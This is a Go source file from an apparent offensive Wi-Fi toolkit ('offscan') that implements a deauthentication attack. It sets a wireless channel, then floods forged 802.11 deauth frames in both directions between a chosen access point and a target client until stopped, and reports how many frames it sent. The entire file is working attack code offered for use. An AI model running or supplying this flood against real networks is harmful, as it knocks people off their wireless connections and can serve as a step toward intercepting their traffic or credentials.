/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package deauth

import (
	"fmt"
	"net"
	"time"

	"offscan/internal/dot11build"
	"offscan/internal/sockets"
	"offscan/internal/sysconf"
	"offscan/internal/utils"
)



func Run(args []string) {
    da := deauthAttack{}
    da.parseArgs(args)
    da.execute()
}



type deauthAttack struct {
    iface      net.Interface
    channel    int
    builder    dot11build.Deauth
    frmsSent   int
    seqNum     uint16
    socket     sockets.Layer2Socket
    apMAC      net.HardwareAddr
    targetMAC  net.HardwareAddr
    delay      time.Duration
    timeStart  time.Time
}



func (da *deauthAttack) execute() {
    sysconf.MustSetChannel(da.iface, da.channel)
    da.displayInfo()
    da.sendEndlessly()
    da.displayExecInfo()
    da.closeSocket()
}



func (da *deauthAttack) displayInfo() {
    fmt.Printf("[i] IFACE...: %s\n", da.iface.Name)
    fmt.Printf("[i] BSSID...: %s\n", da.apMAC.String())
    fmt.Printf("[i] TARGET..: %s\n", da.targetMAC.String())
    fmt.Printf("[i] CHANNEL.: %d\n", da.channel)
}



func (da *deauthAttack) sendEndlessly() {
    ctx   := utils.SignalContext()
    shots := 0

    da.builder.SetBSSID(da.apMAC)

    fmt.Println("[+] Sending frames. Press Ctrl + C to stop")
    da.timeStart = time.Now()

    for {
        select {
        case <-ctx.Done():
            return

        default:
            da.sendFrame(da.targetMAC, da.apMAC)
            da.sendFrame(da.apMAC, da.targetMAC)
            shots += 2

            if shots >= 128 {
                shots = 0
                time.Sleep(da.delay)
            }
        }
    }
}



func (da *deauthAttack) sendFrame(srcMac, dstMac net.HardwareAddr) {
    da.builder.SetSrcAddr(srcMac)
    da.builder.SetDstAddr(dstMac)
    da.builder.SetSeqCtrl(da.seqNum)
    
    frame := da.builder.Frame()
    da.socket.Send(frame)
    
	da.updateSeqNum()
    da.frmsSent++
}



func (da *deauthAttack) updateSeqNum() {
    if da.seqNum >= 4095 {
        da.seqNum = 0
    }
    da.seqNum++
}



func (da *deauthAttack) displayExecInfo() {
    elapsed := time.Since(da.timeStart).Seconds()
    fmt.Printf("\n[-] Flood interrupted\n")
    fmt.Printf("[%%] Frames sent: %d in %.2f s\n", da.frmsSent, elapsed)
}



func (da *deauthAttack) closeSocket() {
    if err := da.socket.Close(); err != nil {
        fmt.Printf("[!] Error closing socket: %v\n", err)
    }
}